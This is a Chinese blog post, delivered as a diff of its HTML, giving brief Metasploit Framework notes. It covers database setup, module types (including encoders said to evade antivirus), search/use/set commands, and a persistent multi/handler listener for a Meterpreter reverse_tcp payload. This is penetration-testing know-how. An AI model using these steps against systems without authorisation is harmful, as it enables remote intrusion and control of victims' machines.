@@ -1,0 +1,209 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Metasploit Framework | Jindom's Blog</title><meta name="author" content="Jindom"><meta name="copyright" content="Jindom"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="注意:使用前先 msfupdate 文件目录&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F; 数据库操作msf &gt; msfdb[*] exec: msfdbManage a metasploit framework database msfdb init # initialize the databasemsfdb reinit # delete and reinitiali">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploit Framework">
+<meta property="og:url" content="https://blog.jinzz.cc/359249428bd5/index.html">
+<meta property="og:site_name" content="Jindom&#39;s Blog">
+<meta property="og:description" content="注意:使用前先 msfupdate 文件目录&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F; 数据库操作msf &gt; msfdb[*] exec: msfdbManage a metasploit framework database msfdb init # initialize the databasemsfdb reinit # delete and reinitiali">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.jinzz.cc/images/cover11.jpg">
+<meta property="article:published_time" content="2017-03-09T00:00:00.000Z">
+<meta property="article:modified_time" content="2021-06-01T08:43:16.046Z">
+<meta property="article:author" content="Jindom">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.jinzz.cc/images/cover11.jpg"><link rel="shortcut icon" href="/images/favicon.png"><link rel="canonical" href="https://blog.jinzz.cc/359249428bd5/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Metasploit Framework',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-06-01 16:43:16'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">125</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/images/cover11.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Jindom's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Metasploit Framework</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2017-03-09T00:00:00.000Z" title="发表于 2017-03-09 08:00:00">2017-03-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-06-01T08:43:16.046Z" title="更新于 2021-06-01 16:43:16">2021-06-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/metasploit/">metasploit</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Metasploit Framework"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>注意:使用前先</p>
+<p>msfupdate</p>
+<h2 id="文件目录"><a href="#文件目录" class="headerlink" title="文件目录"></a>文件目录</h2><p>/usr/share/metasploit-framework/</p>
+<h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><p>msf &gt; msfdb<br>[*] exec: msfdb<br>Manage a metasploit framework database</p>
+<p>msfdb init # initialize the database<br>msfdb reinit # delete and reinitialize the database<br>msfdb delete # delete database and stop using it<br>msfdb start # start the database<br>msfdb stop # stop the database</p>
+<p>建立数据库缓存</p>
+<p>msf &gt; service postgresql start<br>msf &gt; db_rebuild_cache</p>
+<h2 id="技术功能模块"><a href="#技术功能模块" class="headerlink" title="技术功能模块"></a>技术功能模块</h2><h3 id="Exploits-利用系统漏洞进行攻击的模块-对应每一个具体漏洞的攻击方法"><a href="#Exploits-利用系统漏洞进行攻击的模块-对应每一个具体漏洞的攻击方法" class="headerlink" title="Exploits   利用系统漏洞进行攻击的模块,对应每一个具体漏洞的攻击方法"></a>Exploits   利用系统漏洞进行攻击的模块,对应每一个具体漏洞的攻击方法</h3><h3 id="Payload-成功exploit之后-真正在目标系统执行的代码或者指令"><a href="#Payload-成功exploit之后-真正在目标系统执行的代码或者指令" class="headerlink" title="Payload   成功exploit之后,真正在目标系统执行的代码或者指令"></a>Payload   成功exploit之后,真正在目标系统执行的代码或者指令</h3><p>Single: all in one 体积较大,全功能</p>
+<p>Stager: 体积较小,用于建立连接</p>
+<p>Stages: 建立连接之后下载的后续payload</p>
+<h3 id="Auxiliary-信息收集-指纹-扫描-枚举等功能的辅助模块"><a href="#Auxiliary-信息收集-指纹-扫描-枚举等功能的辅助模块" class="headerlink" title="Auxiliary   信息收集,指纹,扫描,枚举等功能的辅助模块"></a>Auxiliary   信息收集,指纹,扫描,枚举等功能的辅助模块</h3><h3 id="Encoders-对payload进行加密以躲避AV检查"><a href="#Encoders-对payload进行加密以躲避AV检查" class="headerlink" title="Encoders   对payload进行加密以躲避AV检查"></a>Encoders   对payload进行加密以躲避AV检查</h3><h3 id="Nops-提高payload稳定性及维持大小"><a href="#Nops-提高payload稳定性及维持大小" class="headerlink" title="Nops   提高payload稳定性及维持大小"></a>Nops   提高payload稳定性及维持大小</h3><p> </p>
+<h2 id="MSF控制台命令"><a href="#MSF控制台命令" class="headerlink" title="MSF控制台命令"></a>MSF控制台命令</h2><p> </p>
+<h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><p>search name:mysql  path:scada  platform:aix type:aux author:aaron  cve:2011    可多条件同时搜索</p>
+<p>search -h  帮助</p>
+<h3 id="Use"><a href="#Use" class="headerlink" title="Use"></a>Use</h3><p>use 漏洞路径</p>
+<p>– info  显示详细信息</p>
+<p>– show options 显示可修改选项</p>
+<p>–show payloads 显示可利用payloads</p>
+<p>–show targets 显示可用目标</p>
+<p>–show advanced 显示高级</p>
+<p>–show evasion 显示躲避</p>
+<p>–show missing  显示还剩什么没填完</p>
+<p> </p>
+<h3 id="set-参数"><a href="#set-参数" class="headerlink" title="set 参数"></a>set 参数</h3><p>set RHOST 192.168.8.117<br>set target //指定目标操作系统<br>unset //取消设置</p>
+<h3 id="setg-参数"><a href="#setg-参数" class="headerlink" title="setg 参数"></a>setg 参数</h3><p>和set不同的是setg //set_global  全局设置</p>
+<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>一些exploit漏洞需要注入payload达到渗透功能</p>
+<p>-show payloads 显示适配的payload</p>
+<p>-set payload 路径  选择payload</p>
+<p>Exploit漏洞利用过程:  search到漏洞—-&gt;use 路径—-&gt;info查看信息以及show option—-&gt;set 参数—-&gt;set payload指定payload—-&gt;run 进行exploit</p>
+<p> </p>
+<h3 id="建立持续性监听端口"><a href="#建立持续性监听端口" class="headerlink" title="建立持续性监听端口"></a>建立持续性监听端口</h3><p>msf&gt;use exploit/multi/handler<br>msf&gt;set payload windows/meterpreter/reverse_tcp<br>msf&gt;set lhost <local IP><br>msf&gt;set lport <local port><br>msf&gt;set ExitOnSession false<br>msf&gt;exploit -j</p>
+<p>-j选项能够让这个exploit以jobs的形式持续在后台运行。</p>
+<p>set ExitOnSession false 能够让单个session退出时jobs不结束，同时可以维持多个sessions</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Jindom</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://blog.jinzz.cc/359249428bd5/">https://blog.jinzz.cc/359249428bd5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.jinzz.cc" target="_blank">Jindom's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/images/cover11.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/3a611c8ee721/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/cover4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">IIS 6.0 WebDAV Overflow</div></div></a></div><div class="next-post pull-right"><a href="/900364932e37/"><img class="next-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/cover20.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Polycraft World ----Minecraft化学项目</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Jindom</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">125</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/jindom"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/jindom" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:jinzz@jinzz.cc" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">文件目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C"><span class="toc-number">2.</span> <span class="toc-text">数据库操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97"><span class="toc-number">3.</span> <span class="toc-text">技术功能模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploits-%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB%E7%9A%84%E6%A8%A1%E5%9D%97-%E5%AF%B9%E5%BA%94%E6%AF%8F%E4%B8%80%E4%B8%AA%E5%85%B7%E4%BD%93%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">Exploits   利用系统漏洞进行攻击的模块,对应每一个具体漏洞的攻击方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload-%E6%88%90%E5%8A%9Fexploit%E4%B9%8B%E5%90%8E-%E7%9C%9F%E6%AD%A3%E5%9C%A8%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E6%89%A7%E8%A1%8C%E7%9A%84%E4%BB%A3%E7%A0%81%E6%88%96%E8%80%85%E6%8C%87%E4%BB%A4"><span class="toc-number">3.2.</span> <span class="toc-text">Payload   成功exploit之后,真正在目标系统执行的代码或者指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Auxiliary-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%8C%87%E7%BA%B9-%E6%89%AB%E6%8F%8F-%E6%9E%9A%E4%B8%BE%E7%AD%89%E5%8A%9F%E8%83%BD%E7%9A%84%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97"><span class="toc-number">3.3.</span> <span class="toc-text">Auxiliary   信息收集,指纹,扫描,枚举等功能的辅助模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Encoders-%E5%AF%B9payload%E8%BF%9B%E8%A1%8C%E5%8A%A0%E5%AF%86%E4%BB%A5%E8%BA%B2%E9%81%BFAV%E6%A3%80%E6%9F%A5"><span class="toc-number">3.4.</span> <span class="toc-text">Encoders   对payload进行加密以躲避AV检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nops-%E6%8F%90%E9%AB%98payload%E7%A8%B3%E5%AE%9A%E6%80%A7%E5%8F%8A%E7%BB%B4%E6%8C%81%E5%A4%A7%E5%B0%8F"><span class="toc-number">3.5.</span> <span class="toc-text">Nops   提高payload稳定性及维持大小</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4"><span class="toc-number">4.</span> <span class="toc-text">MSF控制台命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#search"><span class="toc-number">4.1.</span> <span class="toc-text">search</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Use"><span class="toc-number">4.2.</span> <span class="toc-text">Use</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#set-%E5%8F%82%E6%95%B0"><span class="toc-number">4.3.</span> <span class="toc-text">set 参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#setg-%E5%8F%82%E6%95%B0"><span class="toc-number">4.4.</span> <span class="toc-text">setg 参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload"><span class="toc-number">4.5.</span> <span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B%E6%8C%81%E7%BB%AD%E6%80%A7%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3"><span class="toc-number">4.6.</span> <span class="toc-text">建立持续性监听端口</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/333a4773e2de/" title="Hi Hexo!"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/cover15.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hi Hexo!"/></a><div class="content"><a class="title" href="/333a4773e2de/" title="Hi Hexo!">Hi Hexo!</a><time datetime="2021-06-03T16:00:00.000Z" title="发表于 2021-06-04 00:00:00">2021-06-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/57793b1394cf/" title="Nginx启用Alt-Svc加速网站访问速度"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/cover14.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nginx启用Alt-Svc加速网站访问速度"/></a><div class="content"><a class="title" href="/57793b1394cf/" title="Nginx启用Alt-Svc加速网站访问速度">Nginx启用Alt-Svc加速网站访问速度</a><time datetime="2021-02-20T00:00:00.000Z" title="发表于 2021-02-20 08:00:00">2021-02-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/54a54b32a7f3/" title="AD拿域控权限的方法整理"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/cover2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AD拿域控权限的方法整理"/></a><div class="content"><a class="title" href="/54a54b32a7f3/" title="AD拿域控权限的方法整理">AD拿域控权限的方法整理</a><time datetime="2020-10-26T00:00:00.000Z" title="发表于 2020-10-26 08:00:00">2020-10-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/1fc49bae5dd1/" title="Cobalt Strike TeamServer CloudFlare HTTPS 防溯源部署"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/cover18.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cobalt Strike TeamServer CloudFlare HTTPS 防溯源部署"/></a><div class="content"><a class="title" href="/1fc49bae5dd1/" title="Cobalt Strike TeamServer CloudFlare HTTPS 防溯源部署">Cobalt Strike TeamServer CloudFlare HTTPS 防溯源部署</a><time datetime="2020-09-24T00:00:00.000Z" title="发表于 2020-09-24 08:00:00">2020-09-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/f5858198c6fa/" title="蓝队实战笔记"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/cover8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蓝队实战笔记"/></a><div class="content"><a class="title" href="/f5858198c6fa/" title="蓝队实战笔记">蓝队实战笔记</a><time datetime="2020-08-15T00:00:00.000Z" title="发表于 2020-08-15 08:00:00">2020-08-15</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;1949 - 2021 By Jindom</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="true"></script><script src="//code.tidio.co/eucyopvw8zt034ovoshroc4kci4qpweh.js" async="async"></script><script>function onTidioChatApiReady() {
+  window.tidioChatApi.hide();
+  window.tidioChatApi.on("close", function() {
+    window.tidioChatApi.hide();
+  });
+}
+if (window.tidioChatApi) {
+  window.tidioChatApi.on("ready", onTidioChatApiReady);
+} else {
+  document.addEventListener("tidioChat-ready", onTidioChatApiReady);
+}
+
+var chatBtnFn = () => {
+  document.getElementById("chat_btn").addEventListener("click", function(){
+    window.tidioChatApi.show();
+    window.tidioChatApi.open();
+  });
+}
+chatBtnFn()
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
